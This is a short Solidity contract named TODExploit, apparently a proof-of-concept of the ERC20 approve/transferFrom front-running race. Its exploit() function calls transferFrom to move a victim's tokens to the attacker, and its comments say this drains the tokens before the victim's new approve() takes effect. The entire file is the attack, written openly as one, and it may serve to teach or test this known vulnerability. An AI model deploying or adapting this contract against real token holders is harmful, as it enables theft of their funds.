pragma solidity ^0.4.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract TODExploit {
    IERC20 public target;
    address public victim;
    address public attacker;

    constructor(address _target, address _victim) public {
        target = IERC20(_target);
        victim = _victim;
        attacker = msg.sender;
    }

    // Simulates a front-running exploit
    function exploit(uint256 value) public {
        require(msg.sender == attacker, "Only attacker can exploit");

        // Attacker uses transferFrom to drain tokens before victim's new approve() takes effect
        // This assumes attacker is already approved by victim for some amount
        target.transferFrom(victim, attacker, value);
    }
}

